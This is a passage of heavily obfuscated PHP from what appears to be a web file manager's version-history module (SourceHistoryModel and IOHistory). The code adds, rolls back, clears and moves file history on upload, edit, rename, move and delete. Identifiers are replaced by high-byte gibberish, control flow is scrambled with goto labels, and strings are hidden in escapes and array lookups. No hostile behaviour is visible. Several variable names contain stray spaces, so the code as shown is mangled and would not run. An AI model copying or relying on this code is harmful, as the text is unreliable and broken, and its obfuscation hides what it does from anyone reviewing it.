$this->eventListParse($dÈÙ¨²²¤, $fŸÌ»Á ëó); goto Eñ’ï‰ÁÒˆ; CÉÊÈÕ¡ä: $FÎ ñˆ§š¾ =& $_SERVER[æ§›¦ÌáØ]; $bÙÊˆš†¡ = Model($FÎ ñˆ§š¾[1196])->sourceInfo($fŸÌ»Á ëó); $d‹¶¸ë„ˆĞ = array($FÎ ñˆ§š¾[410] => $fŸÌ»Á ëó); goto FÈ½¯‰‚‡‚; Eñ’ï‰ÁÒˆ: } private function eventListParse($Aè„‹ÒÙ•‚, $EØå£¬·àÈ) { goto E…£Ø”ğ»‹; f«èùõæ…á: $Aˆ‘ŒÎŠù = array_to_keyvalue($B¥Ñå¦«ôÂ, $B»»‚ñ‘ÊÛ[33], $B»»‚ñ‘ÊÛ[1902]); foreach ($B¥Ñå¦«ôÂ as $D‘¢âºí«ƒ) { $C•ºù¹§Ç = $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]]; if ($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[29]] == $B»»‚ñ‘ÊÛ[533] && isset($C•ºù¹§Ç[$B»»‚ñ‘ÊÛ[1045]])) { $fº‰™ÁÃ·Š[] = $C•ºù¹§Ç[$B»»‚ñ‘ÊÛ[1045]] . $B»»‚ñ‘ÊÛ[33]; $fº‰™ÁÃ·Š[] = $C•ºù¹§Ç[$B»»‚ñ‘ÊÛ[1046]] . $B»»‚ñ‘ÊÛ[33]; } if ($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[29]] == $B»»‚ñ‘ÊÛ[1910] && isset($C•ºù¹§Ç[$B»»‚ñ‘ÊÛ[395]])) { $fº‰™ÁÃ·Š[] = $C•ºù¹§Ç[$B»»‚ñ‘ÊÛ[395]] . $B»»‚ñ‘ÊÛ[33]; } } $fº‰™ÁÃ·Š = array_merge($fº‰™ÁÃ·Š, $Aˆ‘ŒÎŠù, array($EØå£¬·àÈ . $B»»‚ñ‘ÊÛ[33])); goto eÂ³•”‡ÂÄ; E…£Ø”ğ»‹: $B»»‚ñ‘ÊÛ =& $_SERVER[æ§›¦ÌáØ]; $B¥Ñå¦«ôÂ = $Aè„‹ÒÙ•‚[$B»»‚ñ‘ÊÛ[367]]; $fº‰™ÁÃ·Š = array_to_keyvalue($B¥Ñå¦«ôÂ, $B»»‚ñ‘ÊÛ[33], $B»»‚ñ‘ÊÛ[395]); goto f«èùõæ…á; EÏÈËĞ”ßø: $Bô›ÂÜç‰– = Model($B»»‚ñ‘ÊÛ[783])->sourceListInfo($fº‰™ÁÃ·Š, !0); foreach ($B¥Ñå¦«ôÂ as &$D‘¢âºí«ƒ) { if ($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[29]] == $B»»‚ñ‘ÊÛ[533] && isset($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[1045]])) { $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[1045]] = $Bô›ÂÜç‰–[$D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[1045]]]; $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[1046]] = $Bô›ÂÜç‰–[$D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[1046]]]; } if ($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[29]] == $B»»‚ñ‘ÊÛ[1910] && isset($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[395]])) { $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[395]] = $Bô›ÂÜç‰–[$D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[431]][$B»»‚ñ‘ÊÛ[395]]]; } $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[85]] = $Bô›ÂÜç‰–[$D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[395]]]; $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1915]] = $Bô›ÂÜç‰–[$D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1902]]]; if ($D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[29]] == $B»»‚ñ‘ÊÛ[1655]) { $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1915]] = $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[85]]; $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1902]] = $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1915]][$B»»‚ñ‘ÊÛ[395]]; $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[85]] = !1; $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[395]] = $B»»‚ñ‘ÊÛ[33]; } $D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1846]] = $f¡¥ß‡—‡ø[$D‘¢âºí«ƒ[$B»»‚ñ‘ÊÛ[1520]]]; } unset($D‘¢âºí«ƒ); goto Aãªµ‡ĞÏ; eÂ³•”‡ÂÄ: $fº‰™ÁÃ·Š = array_unique($fº‰™ÁÃ·Š); $Eİ­¨¹§ñ = array_unique(array_to_keyvalue($B¥Ñå¦«ôÂ, $B»»‚ñ‘ÊÛ[33], $B»»‚ñ‘ÊÛ[1520])); $f¡¥ß‡—‡ø = Model($B»»‚ñ‘ÊÛ[519])->userListInfo($Eİ­¨¹§ñ); goto EÏÈËĞ”ßø; Aãªµ‡ĞÏ: $Aè„‹ÒÙ•‚[$B»»‚ñ‘ÊÛ[367]] = $B¥Ñå¦«ôÂ; return $Aè„‹ÒÙ•‚; goto BĞâËçÍø; BĞâËçÍø: } public function removeBySource($fìƒçÃ±Á„) { $eÌ†ã‹ÀÇ = array($_SERVER[æ§›¦ÌáØ][410] => $fìƒçÃ±Á„); $this->where($eÌ†ã‹ÀÇ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\143\x65\x5f\150\151\x73\x74\x6f\162\171"; public function historyCount($DÀì˜ø‡Ÿ”) { goto Eª”ßğ¬£Ğ; Eª”ßğ¬£Ğ: $b“„Š®£É =& $_SERVER[æ§›¦ÌáØ]; if (!$DÀì˜ø‡Ÿ”) { return array(); } if (is_string($DÀì˜ø‡Ÿ”) || is_int($DÀì˜ø‡Ÿ”)) { $DÀì˜ø‡Ÿ” = array($DÀì˜ø‡Ÿ”); } goto fª¾ê¸õ§; b£İĞˆœ†Š: return array_to_keyvalue($CøÔÎÒ, $b“„Š®£É[395], $b“„Š®£É[480]); goto D¶†¯™Š½; fª¾ê¸õ§: $D¯³ÍÈ–² = array($b“„Š®£É[395], $b“„Š®£É[1721] => $b“„Š®£É[480]); $d©‘¤Ä„í‡ = array($b“„Š®£É[395] => array($b“„Š®£É[7], $DÀì˜ø‡Ÿ”)); $CøÔÎÒ = $this->field($D¯³ÍÈ–²)->where($d©‘¤Ä„í‡)->group($b“„Š®£É[395])->select(); goto b£İĞˆœ†Š; D¶†¯™Š½: } public function addHistory($E½»æâÔ†”, $f¿ƒµĞì…ƒ = '') { $f†ƒñö˜Ä¹ =& $_SERVER[æ§›¦ÌáØ]; $A»Ğí½Öö = array($f†ƒñö˜Ä¹[410] => $E½»æâÔ†”[$f†ƒñö˜Ä¹[395]], $f†ƒñö˜Ä¹[1511] => isset($E½»æâÔ†”[$f†ƒñö˜Ä¹[434]]) ? $E½»æâÔ†”[$f†ƒñö˜Ä¹[434]] : $E½»æâÔ†”[$f†ƒñö˜Ä¹[432]], $f†ƒñö˜Ä¹[448] => $E½»æâÔ†”[$f†ƒñö˜Ä¹[447]], $f†ƒñö˜Ä¹[561] => $E½»æâÔ†”[$f†ƒñö˜Ä¹[78]], $f†ƒñö˜Ä¹[1916] => $f¿ƒµĞì…ƒ); $C©©™±ÓÂ = $GLOBALS[$f†ƒñö˜Ä¹[6]][$f†ƒñö˜Ä¹[88]][$f†ƒñö˜Ä¹[1094]]; if ($C©©™±ÓÂ > 1) { $this->historyAutoClear($A»Ğí½Öö[$f†ƒñö˜Ä¹[395]]); $this->add($A»Ğí½Öö); } Hook::trigger($f†ƒñö˜Ä¹[1917], $A»Ğí½Öö); Model($f†ƒñö˜Ä¹[1918])->eventFileEdit($E½»æâÔ†”[$f†ƒñö˜Ä¹[395]]); } private function historyAutoClear($fĞ¥Ö×‘‚) { goto Bµ©Ë¯Œ÷; bíß³¬Ûß½: $this->where($e¾‘õÚë)->delete(); Model($e¶‚Ñ¹Õ¾[450])->remove($B°í¿À§À˜); goto Cê¯Åí‰×È; f‘èÉ«„”ñ: $B°í¿À§À˜ = array_slice($B°í¿À§À˜, $BÅ•Óš®èÄ); if (!$dİĞç½ä‡ || !$B°í¿À§À˜) { return; } $e¾‘õÚë = array($e¶‚Ñ¹Õ¾[412] => array($e¶‚Ñ¹Õ¾[7], $dİĞç½ä‡)); goto bíß³¬Ûß½; Bµ©Ë¯Œ÷: $e¶‚Ñ¹Õ¾ =& $_SERVER[æ§›¦ÌáØ]; $C—øÆÈ•ÉØ = Model($e¶‚Ñ¹Õ¾[723])->get($e¶‚Ñ¹Õ¾[1116]); $C–‹–ŞÇ”Ş = $GLOBALS[$e¶‚Ñ¹Õ¾[6]][$e¶‚Ñ¹Õ¾[88]][$e¶‚Ñ¹Õ¾[1094]]; goto Aè¯ã± ; aÊÆÊ²§ãí: $e¾‘õÚë = array($e¶‚Ñ¹Õ¾[410] => $fĞ¥Ö×‘‚); $FùªÔÍõÇ = $this->field($e¶‚Ñ¹Õ¾[1919])->where($e¾‘õÚë)->order($e¶‚Ñ¹Õ¾[1913])->select(); if (!$FùªÔÍõÇ || $BÅ•Óš®èÄ >= count($FùªÔÍõÇ)) { return; } goto f†ÙİÉºí; Aè¯ã± : $BÅ•Óš®èÄ = $C—øÆÈ•ÉØ == $e¶‚Ñ¹Õ¾[1117] ? 5 : $C–‹–ŞÇ”Ş; if ($C–‹–ŞÇ”Ş <= 1) { $BÅ•Óš®èÄ = 1; } if ($BÅ•Óš®èÄ >= 500) { return; } goto aÊÆÊ²§ãí; f†ÙİÉºí: $dİĞç½ä‡ = array_to_keyvalue($FùªÔÍõÇ, $e¶‚Ñ¹Õ¾[33], $e¶‚Ñ¹Õ¾[393]); $dİĞç½ä‡ = array_slice($dİĞç½ä‡, $BÅ•Óš®èÄ); $B°í¿À§À˜ = array_to_keyvalue($FùªÔÍõÇ, $e¶‚Ñ¹Õ¾[33], $e¶‚Ñ¹Õ¾[447]); goto f‘èÉ«„”ñ; Cê¯Åí‰×È: } public function listData($CÏ¯‰Îó“) { goto eÛ‚˜‰†; EòëÜ‡ÎÈ”: $aÍÃõÑ¹‡Š = $this->field($AŞ Ø’Â ï)->where($Dˆ‰½Šãô‹)->order($e‰¹çŒ‹‹[1913])->selectPage(); $this->_listAppendUser($aÍÃõÑ¹‡Š[$e‰¹çŒ‹‹[367]]); $d°êŸíÜ«Œ = Model($e‰¹çŒ‹‹[723])->get($e‰¹çŒ‹‹[1116]); goto fù¡³èÄƒ; eÛ‚˜‰†: $e‰¹çŒ‹‹ =& $_SERVER[æ§›¦ÌáØ]; $Dˆ‰½Šãô‹ = array($e‰¹çŒ‹‹[410] => $CÏ¯‰Îó“); $AŞ Ø’Â ï = $e‰¹çŒ‹‹[1920]; goto EòëÜ‡ÎÈ”; fù¡³èÄƒ: $BèÓïÕ¡ = 5; if ($d°êŸíÜ«Œ == $e‰¹çŒ‹‹[1117]) { $aÍÃõÑ¹‡Š[$e‰¹çŒ‹‹[367]] = array_slice($aÍÃõÑ¹‡Š[$e‰¹çŒ‹‹[367]], 0, $BèÓïÕ¡); $aÍÃõÑ¹‡Š[$e‰¹çŒ‹‹[364]] = array($e‰¹çŒ‹‹[1921] => 1, $e‰¹çŒ‹‹[1922] => 20, $e‰¹çŒ‹‹[1923] => 1, $e‰¹çŒ‹‹[1924] => count($aÍÃõÑ¹‡Š[$e‰¹çŒ‹‹[367]])); } return $aÍÃõÑ¹‡Š; goto Bç·ŞÎ¢Šò; Bç·ŞÎ¢Šò: } protected function _listAppendUser(&$c‚†Âğ·¶Õ) { $b¦İØÁÀæ =& $_SERVER[æ§›¦ÌáØ]; $FŒ»–š½‘— = array_to_keyvalue($c‚†Âğ·¶Õ, $b¦İØÁÀæ[33], $b¦İØÁÀæ[1520]); $b¢øµáÀëŠ = Model($b¦İØÁÀæ[519])->userListInfo($FŒ»–š½‘—); foreach ($c‚†Âğ·¶Õ as &$C±ï«­”»¯) { $fÇº£ŒËğ¶ = $C±ï«­”»¯[$b¦İØÁÀæ[1520]]; $C±ï«­”»¯[$b¦İØÁÀæ[432]] = $b¢øµáÀëŠ[$fÇº£ŒËğ¶] ? $b¢øµáÀëŠ[$fÇº£ŒËğ¶] : !1; } unset($C±ï«­”»¯); } public function fileInfo($d›¨Åô¾Ö¶) { $FÑĞÂøÖâÀ =& $_SERVER[æ§›¦ÌáØ]; $Eäíõî´“Ò = $this->tablePrefix; $Bßá‰é²§” = "{$Eäíõî´“Ò}\x69\157\137\x66\x69\154\x65\40\x66\151\154\145\x73\40\x6f\156\40\146\151\x6c\x65\163\56\x66\x69\154\145\x49\104\x20\x3d\40\x68\x69\163\164\157\x72\x79\56\146\151\x6c\145\x49\x44"; return $this->alias($FÑĞÂøÖâÀ[1925])->where(array($FÑĞÂøÖâÀ[412] => $d›¨Åô¾Ö¶))->join($Bßá‰é²§”, $FÑĞÂøÖâÀ[1926])->find(); } public function removeItem($aº¦Ëó™³Ö) { $B¸ÁÑ‡¹ëÄ =& $_SERVER[æ§›¦ÌáØ]; $dËôŞÚÚù² = array($B¸ÁÑ‡¹ëÄ[412] => $aº¦Ëó™³Ö); $b¿„âÆîÉÛ = $this->where($dËôŞÚÚù²)->find(); if ($b¿„âÆîÉÛ) { $eƒñëÜìò˜ = $this->where($dËôŞÚÚù²)->delete(); Model($B¸ÁÑ‡¹ëÄ[450])->remove($b¿„âÆîÉÛ[$B¸ÁÑ‡¹ëÄ[447]]); return $eƒñëÜìò˜; } return !1; } public function removeBySource($eÕ¢Ö‰óº) { goto F•ãñÂíã¨; b®×›ÈãÊ—: $eÎùÛùİœ¾ = array($B³´¥ôœ¦[410] => array($B³´¥ôœ¦[7], $eÕ¢Ö‰óº)); $dˆäªê‘‡ = $this->field($B³´¥ôœ¦[448])->where($eÎùÛùİœ¾)->select(); if ($dˆäªê‘‡) { $this->where($eÎùÛùİœ¾)->delete(); $CØá¢Àøâ° = array_to_keyvalue($dˆäªê‘‡, $B³´¥ôœ¦[33], $B³´¥ôœ¦[447]); Model($B³´¥ôœ¦[450])->remove($CØá¢Àøâ°); } goto EšóÔñÇ‰Ê; F•ãñÂíã¨: $B³´¥ôœ¦ =& $_SERVER[æ§›¦ÌáØ]; if (!$eÕ¢Ö‰óº) { return !1; } if (!is_array($eÕ¢Ö‰óº)) { $eÕ¢Ö‰óº = array($eÕ¢Ö‰óº); } goto b®×›ÈãÊ—; EšóÔñÇ‰Ê: return !0; goto f”Ë¹¸Àâæ; f”Ë¹¸Àâæ: } public function setDetail($DÀ˜ğØŸÇâ, $F»Õê®Ô²Î) { $e“²°Ê«­Ğ =& $_SERVER[æ§›¦ÌáØ]; return $this->where(array($e“²°Ê«­Ğ[412] => $DÀ˜ğØŸÇâ))->save(array($e“²°Ê«­Ğ[1916] => $F»Õê®Ô²Î)); } public function rollbackToItem($cÚŠÍ»¬Û, $c£¾Ñ‰ìÎƒ) { goto AòÒÍÈ«ÌÔ; AòÒÍÈ«ÌÔ: $a‘ÚºİÕ´ø =& $_SERVER[æ§›¦ÌáØ]; $C¸»˜…ŒáÏ = Model($a‘ÚºİÕ´ø[783])->sourceInfo($cÚŠÍ»¬Û); $this->addHistory($C¸»˜…ŒáÏ, LNG($a‘ÚºİÕ´ø[1927])); goto Eó”¹§àôÌ; A‚ä–ø‹: return $this->where(array($a‘ÚºİÕ´ø[412] => $c£¾Ñ‰ìÎƒ))->delete(); goto c™…¿ºØ¢Ã; Eó”¹§àôÌ: $f¢ø†ÓĞñ = $this->find($c£¾Ñ‰ìÎƒ); $DóÏ»»ÂÏì = array($a‘ÚºİÕ´ø[447] => $f¢ø†ÓĞñ[$a‘ÚºİÕ´ø[447]], $a‘ÚºİÕ´ø[78] => $f¢ø†ÓĞñ[$a‘ÚºİÕ´ø[78]], $a‘ÚºİÕ´ø[84] => time(), $a‘ÚºİÕ´ø[434] => USER_ID); Model($a‘ÚºİÕ´ø[783])->where(array($a‘ÚºİÕ´ø[395] => $cÚŠÍ»¬Û))->save($DóÏ»»ÂÏì); goto A‚ä–ø‹; c™…¿ºØ¢Ã: } public function clearSame($aíµØø©õ‹) { goto b¥Âª§·—ª; Dõ¸˜½Š¶: if (!$b†ñì†ï°×) { return; } $this->where(array($FÃ¾œˆ¶­§[393] => array($FÃ¾œˆ¶­§[7], $b†ñì†ï°×)))->delete(); Model($FÃ¾œˆ¶­§[450])->remove($DÓÛåğÄ»†); goto a¡—‰¬îØ; b¥Âª§·—ª: $FÃ¾œˆ¶­§ =& $_SERVER[æ§›¦ÌáØ]; $C‚‰””ç¼é = $this->listData($aíµØø©õ‹); $dŞ¯áˆ¿§ = array_to_keyvalue_group($C‚‰””ç¼é, $FÃ¾œˆ¶­§[447]); goto FŠ÷Î§İë; FŠ÷Î§İë: $DÓÛåğÄ»† = array(); $b†ñì†ï°× = array(); foreach ($dŞ¯áˆ¿§ as $CĞ÷µ„¨Á) { if (!$CĞ÷µ„¨Á || count($CĞ÷µ„¨Á) <= 1) { continue; } foreach ($CĞ÷µ„¨Á as $AùÖªàÑŠ) { $DÓÛåğÄ»†[] = $AùÖªàÑŠ[$FÃ¾œˆ¶­§[447]]; $b†ñì†ï°×[] = $AùÖªàÑŠ[$FÃ¾œˆ¶­§[393]]; } } goto Dõ¸˜½Š¶; a¡—‰¬îØ: } public function userSpace() { $c˜–ò´åÄ =& $_SERVER[æ§›¦ÌáØ]; $F¯šãÆî©¾ = $this->tablePrefix; $FÍ‹¨”ß = array($c˜–ò´åÄ[1511] => USER_ID); $d‡éºé†¶Õ = "{$F¯šãÆî©¾}\x69\157\x5f\x66\151\154\x65\40\146\151\x6c\145\x73\x20\157\156\x20\x66\151\x6c\x65\163\56\x66\x69\x6c\x65\111\104\40\x3d\x20\150\x69\x73\164\x6f\162\x79\x2e\146\x69\x6c\145\111\x44"; return $this->alias($c˜–ò´åÄ[1925])->where($FÍ‹¨”ß)->join($d‡éºé†¶Õ, $c˜–ò´åÄ[1926])->sum($c˜–ò´åÄ[78]); } } goto b­ğ¼è´ø; EŠÊÕŒŒ¼™: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto F”àòĞëÚ‚; d»Òëğã¤¸: Hook::bind($B†¾å¦Æ¤‚[1104], $B†¾å¦Æ¤‚[1105]); Hook::bind($B†¾å¦Æ¤‚[1106], $B†¾å¦Æ¤‚[1107]); goto cšœ–›í²; F”àòĞëÚ‚: $B†¾å¦Æ¤‚ =& $_SERVER[æ§›¦ÌáØ]; $bĞùÊå³… = $GLOBALS[$B†¾å¦Æ¤‚[6]][$B†¾å¦Æ¤‚[88]]; if ($bĞùÊå³…[$B†¾å¦Æ¤‚[1093]] != 1) { return; } goto FÍ„…œ“ôß; F¸÷“Â®Ù: Hook::bind($B†¾å¦Æ¤‚[1098], $B†¾å¦Æ¤‚[1099]); Hook::bind($B†¾å¦Æ¤‚[1100], $B†¾å¦Æ¤‚[1101]); Hook::bind($B†¾å¦Æ¤‚[1102], $B†¾å¦Æ¤‚[1103]); goto d»Òëğã¤¸; FÍ„…œ“ôß: if ($bĞùÊå³…[$B†¾å¦Æ¤‚[1094]] <= 0) { return; } if (isset($_REQUEST[$B†¾å¦Æ¤‚[1095]]) && $_REQUEST[$B†¾å¦Æ¤‚[1095]] == $B†¾å¦Æ¤‚[87]) { return; } Hook::bind($B†¾å¦Æ¤‚[1096], $B†¾å¦Æ¤‚[1097]); goto F¸÷“Â®Ù; cšœ–›í²: } public static function eventBeforeUpload($eÙ†­¿·Â±) { if ($eÙ†­¿·Â±[3] && $eÙ†­¿·Â±[3] != REPEAT_REPLACE) { return; } $F®ˆ¸¯«“‘ = self::parsePath($eÙ†­¿·Â±[0]); if (!$F®ˆ¸¯«“‘) { return; } self::add($F®ˆ¸¯«“‘); } public static function eventBeforeEdit($fÙÕÍñÀ×Ì) { $f°–êÖõÔ„ = self::parsePath($fÙÕÍñÀ×Ì[0]); if (!$f°–êÖõÔ„) { return; } self::add($f°–êÖõÔ„); } public static function eventBeforeCopyFile($e·æÌ¢·„¨, $fÍ¥ƒªÖ±ï, $eÎİ¦´¯Á, $aĞ©Î…©åÂ, $a–»’ìÎÈÜ, $DĞ”÷ã˜ƒ’) { $BÃ¾¥Ä = $eÎİ¦´¯Á->getPathOuter($aĞ©Î…©åÂ); $C‘‘Ë©ø = self::parsePath($BÃ¾¥Ä); if (!$C‘‘Ë©ø) { return; } self::add($C‘‘Ë©ø); } public static function eventBeforeRename($f”Î¿ÂŠÜÌ) { $f£«½åŠôÅ =& $_SERVER[æ§›¦ÌáØ]; $A‡Î†ù×ë = self::parsePath($f”Î¿ÂŠÜÌ[0]); if (!$A‡Î†ù×ë) { return; } $cÇ›«é‡ê¡ = self::checkInHistory($A‡Î†ù×ë); if (!$cÇ›«é‡ê¡) { return; } if ($cÇ›«é‡ê¡[$f£«½åŠôÅ[29]] == $f£«½åŠôÅ[193]) { $a¯Â˜ğè¦ˆ = self::listData($A‡Î†ù×ë); if ($a¯Â˜ğè¦ˆ && $a¯Â˜ğè¦ˆ[$f£«½åŠôÅ[367]]) { self::moveHistory($A‡Î†ù×ë, $f”Î¿ÂŠÜÌ[1]); } } else { IO::rename($cÇ›«é‡ê¡[$f£«½åŠôÅ[76]], $f”Î¿ÂŠÜÌ[1]); } } public static function eventBeforeMove($CâÍÅ‚Œ…İ) { goto dÁ™Ïæâ™¼; DŠØ¼÷Ñ‘–: $aèª‹¿‡°  = self::checkInHistory($FéÛåø•ÊÉ); if (!$aèª‹¿‡° ) { return; } $A¤°¯…âÈã = self::pathHistory($E“‹‘½Şì‚); goto E•â¨ÊŞáç; dÁ™Ïæâ™¼: $dôî™¹ =& $_SERVER[æ§›¦ÌáØ]; $FéÛåø•ÊÉ = self::parsePath($CâÍÅ‚Œ…İ[0]); if (!$FéÛåø•ÊÉ) { return; } goto fõ…ĞÑÁĞë; fõ…ĞÑÁĞë: $E“‹‘½Şì‚ = self::parsePath($CâÍÅ‚Œ…İ[1]); if (!$E“‹‘½Şì‚) { return; } $eÏÜ˜µ£¯Ù = $CâÍÅ‚Œ…İ[3]; goto DŠØ¼÷Ñ‘–; E•â¨ÊŞáç: if ($aèª‹¿‡° [$dôî™¹[29]] == $dôî™¹[193]) { $cÒå Š¦š = self::listData($FéÛåø•ÊÉ); $CãâˆÉ õÕ = rtrim($E“‹‘½Şì‚, $dôî™¹[8]) . $dôî™¹[8] . ($eÏÜ˜µ£¯Ù ? $eÏÜ˜µ£¯Ù : get_path_this($FéÛåø•ÊÉ)); $C¦¹ì„÷§ = self::listData($CãâˆÉ õÕ); if ($cÒå Š¦š && $cÒå Š¦š[$dôî™¹[367]] && $C¦¹ì„÷§ && $C¦¹ì„÷§[$dôî™¹[367]]) { return self::clear($FéÛåø•ÊÉ); } if ($cÒå Š¦š && $cÒå Š¦š[$dôî™¹[367]]) { self::moveHistory($FéÛåø•ÊÉ, $eÏÜ˜µ£¯Ù, $A¤°¯…âÈã); } } else { IO::move($aèª‹¿‡° [$dôî™¹[76]], $A¤°¯…âÈã, !1, $eÏÜ˜µ£¯Ù); self::clearEmptyFolder(IO::pathFather($aèª‹¿‡° [$dôî™¹[76]])); } goto e‹”ê£§ó¨; e‹”ê£§ó¨: } public static function eventAfterRemove($D± åùÛõ—, $EæÎŠÍÂŸ) { goto FÁåƒÒæ§ ; DÀàùÛæÉî: if (!$dïÄÁ“Ó»£) { return; } $FÅ–„ë¥· = self::checkInHistory($dïÄÁ“Ó»£); if (!$FÅ–„ë¥·) { return; } goto e·„³´¹ËÑ; FÁåƒÒæ§ : $B„·èÅ–¢ê =& $_SERVER[æ§›¦ÌáØ]; if (!$EæÎŠÍÂŸ) { return; } $dïÄÁ“Ó»£ = self::parsePath($D± åùÛõ—[0]); goto DÀàùÛæÉî; e·„³´¹ËÑ: if ($FÅ–„ë¥·[$B„·èÅ–¢ê[29]] == $B„·èÅ–¢ê[193]) { $f²ÕëÔÒ«Ü = self::listData($dïÄÁ“Ó»£, !1); if ($f²ÕëÔÒ«Ü && $f²ÕëÔÒ«Ü[$B„·èÅ–¢ê[367]]) { self::clear($dïÄÁ“Ó»£, !1); } } else { IO::remove($FÅ–„ë¥·[$B„·èÅ–¢ê[76]]); self::clearEmptyFolder(IO::pathFather($FÅ–„ë¥·[$B„·èÅ–¢ê[76]])); } goto D‚©ìÛ»Â¶; D‚©ìÛ»Â¶: } private static function checkInHistory($aİ¥Ï—¥Û) { $Eòñø­ÆÚÊ = self::pathHistory($aİ¥Ï—¥Û); if (!IO::exist($Eòñø­ÆÚÊ)) { $Eòñø­ÆÚÊ .= $_SERVER[æ§›¦ÌáØ][1108]; } return IO::exist($Eòñø­ÆÚÊ) ? IO::info($Eòñø­ÆÚÊ) : !1; } private static function parsePath($A†“ÈÙ´É) { goto aÃ¯ÓÁŸàÑ; aÃ¯ÓÁŸàÑ: $aÈ‚ÅÈ»ïù =& $_SERVER[æ§›¦ÌáØ]; if (!$A†“ÈÙ´É) { return !1; } if ($GLOBALS[$aÈ‚ÅÈ»ïù[1109]]) { return; } goto FÉ°çÌŸˆ³; eò¾•‚¼³—: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $eÃˆßÂÁ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $aÈ‚ÅÈ»ïù[1112]); foreach ($eÃˆßÂÁ as $D¯Ãìá²ğ“) { if (!$EäÖç‚óø && substr($A†“ÈÙ´É, 0, strlen($D¯Ãìá²ğ“)) == $D¯Ãìá²ğ“) { return !1; } } goto a¥ÊØóğ¿ø; a¥ÊØóğ¿ø: self::log($GLOBALS[$aÈ‚ÅÈ»ïù[1033]] . $aÈ‚ÅÈ»ïù[1113] . $A†“ÈÙ´É); return $A†“ÈÙ´É; goto bë´†æ—¬; F­›è®«øÅ: if (!$Eå¥Âƒã‚· || !$f‘‘‰â÷°­[$aÈ‚ÅÈ»ïù[1110]]) { return !1; } if (substr($A†“ÈÙ´É, 0, strlen(DATA_PATH . $aÈ‚ÅÈ»ïù[1111])) == DATA_PATH . $aÈ‚ÅÈ»ïù[1111]) { return !1; } if ($EäÖç‚óø == KodIO::KOD_SHARE_ITEM) { $a£‘¨ëÔ¼ = IO::init($A†“ÈÙ´É); if ($a£‘¨ëÔ¼->pathParse[$aÈ‚ÅÈ»ïù[1038]]) { return self::parsePath($a£‘¨ëÔ¼->pathParse[$aÈ‚ÅÈ»ïù[1038]]); } return !1; } goto eò¾•‚¼³—; FÉ°çÌŸˆ³: $f‘‘‰â÷°­ = KodIO::parse($A†“ÈÙ´É); $EäÖç‚óø = $f‘‘‰â÷°­[$aÈ‚ÅÈ»ïù[29]]; $Eå¥Âƒã‚· = !$EäÖç‚óø || $EäÖç‚óø == KodIO::KOD_IO || $EäÖç‚óø == KodIO::KOD_SHARE_ITEM; goto F­›è®«øÅ; bë´†æ—¬: } private static function pathHistory($DÊÖ×Õõ‡İ) { $Bö´­ÑŞœŠ =& $_SERVER[æ§›¦ÌáØ]; $Dœçá˜Òšé = self::$_historyBase . ltrim(KodIO::clear($DÊÖ×Õõ‡İ), $Bö´­ÑŞœŠ[8]); $Dœçá˜Òšé = str_replace(array($Bö´­ÑŞœŠ[1114]), array($Bö´­ÑŞœŠ[1115]), $Dœçá˜Òšé); return $Dœçá˜Òšé; } public static function log($b±‰×ò“¹¦) { } public static function historyCount($B“ç”ØñÏ) { $EĞèÆ½Â¡Ü =& $_SERVER[æ§›¦ÌáØ]; $AÈ²Ûå„Š½ = array(); $EÛ…Ù®ìã‰ = array(); foreach ($B“ç”ØñÏ as $cÎ†¢â•ƒ) { $AÍ¬çÍ¤± = get_path_father($cÎ†¢â•ƒ); if (!$EÛ…Ù®ìã‰[$AÍ¬çÍ¤±]) { $EÛ…Ù®ìã‰[$AÍ¬çÍ¤±] = array(); } $EÛ…Ù®ìã‰[$AÍ¬çÍ¤±][] = get_path_this($cÎ†¢â•ƒ); } foreach ($EÛ…Ù®ìã‰ as $AÍ¬çÍ¤± => $f÷‹« ì°×) { $d»á¶„§‚ = self::parsePath($AÍ¬çÍ¤±); if (!$d»á¶„§‚) { continue; } foreach ($f÷‹« ì°× as $B¸Ÿç¬) { $d©ê½ç”‚º = self::listData(rtrim($d»á¶„§‚, $EĞèÆ½Â¡Ü[8]) . $EĞèÆ½Â¡Ü[8] . $B¸Ÿç¬, !1); if ($d©ê½ç”‚º && $d©ê½ç”‚º[$EĞèÆ½Â¡Ü[367]]) { $AÈ²Ûå„Š½[rtrim($AÍ¬çÍ¤±, $EĞèÆ½Â¡Ü[8]) . $EĞèÆ½Â¡Ü[8] . $B¸Ÿç¬] = count($d©ê½ç”‚º[$EĞèÆ½Â¡Ü[367]]); } } } return $AÈ²Ûå„Š½; } public static function add($Fè£à­ ª) { goto A¤ÌôÏµÉ¸; dàÔµ–‚ÃÙ: return self::saveData($dÅæ¼ìá‘¿[$f×²‰çíçÀ[1121]], $b˜ÚçÄ¹„–); goto B‹©Æô¡óõ; 